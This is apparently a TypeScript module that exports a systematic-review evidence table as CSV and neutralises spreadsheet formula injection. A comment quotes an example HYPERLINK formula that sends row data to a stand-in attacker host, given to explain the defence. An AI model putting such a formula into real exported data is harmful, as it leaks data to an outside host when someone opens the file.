/**
 * CSV for the evidence table (4.4).
 *
 * The build plan is blunt about why this file matters: "the export is the
 * reason for several earlier decisions. Values are plaintext so the database
 * can sort and pivot them; numbers are numbers so a column can be averaged;
 * keys are immutable so two exports of the same review agree about what a
 * column is called. If the export is wrong, those decisions bought nothing."
 */

/**
 * Cells that begin with one of these are executed as a formula by Excel,
 * LibreOffice and Google Sheets when the file is opened.
 *
 * This is not hypothetical for this app. Extracted values are typed in by
 * whoever is doing the extraction, and a systematic review is a document
 * people email around: the person opening the CSV is frequently not the
 * person who wrote the cell. A value of
 *
 *     =HYPERLINK("https://evil.example/"&A1,"click")
 *
 * is a perfectly ordinary-looking answer that exfiltrates the row it sits in.
 * Excel's own mitigation (DDE prompts) does not cover every vector and does
 * not exist in Sheets.
 */
const FORMULA_LEADERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutralise a cell that would otherwise be read as a formula.
 *
 * A leading apostrophe is the standard fix: spreadsheets strip it on display
 * and treat the rest as text, so the reader still sees what was extracted.
 *
 * Note "-" is in the list, which means "-3" gets quoted too. That is the
 * trade: a negative number in a TEXT column exports as text. Numbers go
 * through their own path below and are unaffected, so the only casualty is a
 * negative number someone typed into a free-text field — which was already
 * text as far as the database is concerned.
 */
export function neutralise(value: string): string {
  return FORMULA_LEADERS.some((c) => value.startsWith(c)) ? `'${value}` : value;
}

/** RFC 4180: quote if the value contains a delimiter, a quote or a newline. */
export function csvCell(value: string): string {
  const safe = neutralise(value);
  return /[",\r\n]/.test(safe) ? `"${safe.replaceAll('"', '""')}"` : safe;
}

export function toCsv(header: readonly string[], rows: readonly (readonly string[])[]) {
  const lines = [header.map(csvCell).join(",")];
  for (const row of rows) lines.push(row.map(csvCell).join(","));

  /*
   * CRLF per RFC 4180, and a UTF-8 BOM.
   *
   * The BOM is not decoration: without it Excel on Windows reads the file as
   * the legacy system codepage, and every non-ASCII character in an author
   * name or a quoted passage is mangled. Sheets and modern Excel both ignore
   * it. A systematic review with international sources is exactly the case
   * that breaks.
   */
  return `\uFEFF${lines.join("\r\n")}\r\n`;
}
